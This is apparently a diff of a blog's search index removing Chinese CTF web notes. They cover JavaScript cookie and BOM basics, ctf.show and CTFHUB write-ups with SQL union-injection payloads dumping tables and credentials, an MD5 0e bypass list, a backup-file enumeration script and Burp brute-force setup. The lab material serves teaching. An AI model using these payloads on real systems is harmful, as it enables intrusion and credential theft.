-  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       x.<span class="property">innerHTML</span>=<span class="string">&#x27;HELLO WORLD!&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<blockquote>
-<p>将元素该为框架iframe框架</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;&lt;ifream src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifream&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>动态创建HTML内容</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">Date</span>());<span class="comment">//向页面中写入当前时间</span></span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;ifrema src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifrema&gt;&quot;</span>)<span class="comment">//向页面中写入框架</span></span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p>示例</p>
-<blockquote>
-<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span>kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">         Hello!敬请T期待</span><br><span class="line">     <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     	<span class="keyword">function</span> <span class="title function_">changetext</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="language-javascript">         &#123;</span></span><br><span class="line"><span class="language-javascript">             id.<span class="property">innerHTML</span>=<span class="string">&quot;Kingwempity@敬请T期待&quot;</span>;<span class="comment">//点击后变化的内容</span></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;changetext(this)&quot;</span>&gt;</span></span><br><span class="line">         点我会发生变化o_o哦！</span><br><span class="line">     <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><blockquote>
-<p>BOM:浏览器对象模型(Browser Object Model)</p>
-</blockquote>
-<blockquote>
-<p>让浏览器来警告用户:</p>
-<p>警告弹窗alert()</p>
-<p>确认弹窗confirm()</p>
-<p>提示弹窗prompt()</p>
-<p>以上弹窗常用于简单的调试和信息展示。例如XSS漏洞测试</p>
-</blockquote>
-<blockquote>
-<p>获取用户cookie（通常为浏览器发给用户客户端的一小段文本信息）</p>
-<blockquote>
-<p>常见场景：</p>
-<p>用户输入用户名和密码成功登录网站后，网站会生成一个cookie给用户，当作用户凭证</p>
-</blockquote>
-<p>cookie一般在控制台的network或Application中可以查看</p>
-<ul>
-<li><p>获取Cookie</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//获取cookie</span></span><br></pre></td></tr></table></figure></div>
-
-
-</li>
-<li><p>修改写入Cookie</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">doucment.<span class="property">cookie</span>=<span class="string">&quot;写入值&quot;</span>#值的形式key=value</span><br></pre></td></tr></table></figure></div>
-
-
-</li>
-<li><p>显示cookie</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</blockquote>
-<blockquote>
-<p>获取浏览器屏幕信息</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)screen</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>获取&#x2F;控制用户页面的URL</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://kingwempity.github.io/&quot;</span><span class="comment">//控制当前页面url</span></span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>获取访问者浏览器信息</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)navigator</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>操作浏览器窗口</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//打开页面</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//关闭页面</span></span><br></pre></td></tr></table></figure></div>
-
-
-
-</blockquote>
-<p>敬请T期待！</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-        <tag>Web</tag>
-        <tag>安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctf.show_web</title>
-    <url>/2024/02/20/ctf-show-web/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer">
-
-<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
-<blockquote>
-<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
-</blockquote>
-<blockquote>
-<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
-<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
-</blockquote>
-<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
-<blockquote>
-<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
-<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
-</blockquote>
-<blockquote>
-<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
-</blockquote>
-<blockquote>
-<ul>
-<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
-<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
-</ul>
-</blockquote>
-<blockquote>
-<p>两个md5值进行弱类型比较</p>
-<blockquote>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p>MD5加密后会变成这个样子</p>
-<blockquote>
-<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
-</blockquote>
-<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
-<blockquote>
-<p>0&#x3D;&#x3D;0</p>
-</blockquote>
-<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
-</blockquote>
-<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
-<blockquote>
-<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
-</blockquote>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
-<p>SQL联合注入</p>
-</blockquote>
-<blockquote>
-<p>打开题目看见文章列表，随机点击，点第一个</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
-<blockquote>
-<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
-<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
-<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>
-
-<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>
-
-<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
-<blockquote>
-<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
-<blockquote>
-<p>判断数据库</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
-<blockquote>
-<p>查看web数据库中的flag表</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
-<blockquote>
-<p>查看flag表中的flag字段</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>
-
-<p>也可使用</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>
-
-
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
-<blockquote>
-<p>查看目标FLAG</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
-<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><blockquote>
-<p>SQL联合注入，GET请求方式</p>
-</blockquote>
-<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_1.png" alt="ctfshow_web14_1" style="zoom:80%;">
-
-<blockquote>
-<p>尝试输入c获取$url,发现输入555555、3333、6000000时间过于漫长，输入1、2、3发现输入3时输出并非@A@,而是@<a class="link" href="mailto:&#65;&#64;&#x68;&#101;&#x72;&#x65;&#x5f;&#x31;&#115;&#95;&#x79;&#x6f;&#117;&#114;&#95;&#x66;&#x31;&#97;&#x67;&#46;&#112;&#104;&#112;">&#65;&#64;&#x68;&#101;&#x72;&#x65;&#x5f;&#x31;&#115;&#95;&#x79;&#x6f;&#117;&#114;&#95;&#x66;&#x31;&#97;&#x67;&#46;&#112;&#104;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>@A@，或许here_1s_your_f1ag.php里面就包含flag，查看here_1s_your_f1ag.php文件，发现查询页面，查看是否能进行SQL注入</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_2.png" alt="ctfshow_web14_2"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_3.png" alt="ctfshow_web14_3"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_4.png" alt="ctfshow_web14_4"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_5.png" alt="ctfshow_web14_5"></p>
-<blockquote>
-<p>通过以上判断该题为SQL注入，注入点为数值型注入, 页面有回显, 推荐使用联合注入</p>
-</blockquote>
-<blockquote>
-<p><u><strong>获取当前使用的数据库(爆库）</strong></u></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/database()</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_6.png" alt="ctfshow_web14_6"></p>
-<blockquote>
-<p><u><strong>获取数据库中的表(爆表)</strong></u></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_7.png" alt="ctfshow_web14_7"></p>
-<blockquote>
-<p><u><strong>获取表中的字段(爆字段)</strong></u></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_8.png" alt="ctfshow_web14_8"></p>
-<blockquote>
-<p><u><strong>查询字段内容(查字段)</strong></u></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(username,password)/**/from/**/content</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_9.png" alt="ctfshow_web14_9"></p>
-<blockquote>
-<p>flag不在这，它不讲武德了啊，看来flag不在这，回去看PHP代码，里面有一个Include(“secret.php”);或许真的flag就在里面</p>
-</blockquote>
-<blockquote>
-<p>先访问一下 secret.php 文件, 可以正常访问, 没有报404, 说明这个文件确实存在, 而且就在根目录下, apache的默认网站根路径是 &#x2F;var&#x2F;www&#x2F;html, 我们试一下读这个文件的内容</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_10.png" alt="ctfshow_web14_10"></p>
-<blockquote>
-<p>发现提示&#x2F;real_flag_is_here,查看地址，发现flag</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_11.png" alt="ctfshow_web14_11"></p>
-<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
-<hr>
-<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
-<p>falg</p>
-<hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
-<hr>
-<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
-<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">
-
-<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
-<hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
-<hr>
-<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
-<hr>
-<blockquote>
-<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
-<ul>
-<li>tar</li>
-<li>tar.gz</li>
-<li>zip</li>
-<li>rar</li>
-</ul>
-<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
-<ul>
-<li>web</li>
-<li>website</li>
-<li>backup</li>
-<li>back</li>
-<li>www</li>
-<li>wwwroot</li>
-<li>temp</li>
-</ul>
-</blockquote>
-<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">
-
-<p>文件下载，用python脚本，requests</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
-<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
-<p>打开flag文件，发现没有flag</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
-<p>直接用</p>
-<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
-<p><strong>弱口令</strong></p>
-<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
-</blockquote>
-<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
-<p>开启burp代理</p>
-<p>登录信息随便填，抓到request请求如下</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>CTF</tag>
-        <tag>ctf.show</tag>
       </tags>
   </entry>
   <entry>
@@ -2637,17 +2200,440 @@ over</p>
       </tags>
   </entry>
   <entry>
-    <title>敬请T期待</title>
-    <url>/2024/01/16/%E6%95%AC%E8%AF%B7T%E6%9C%9F%E5%BE%85/</url>
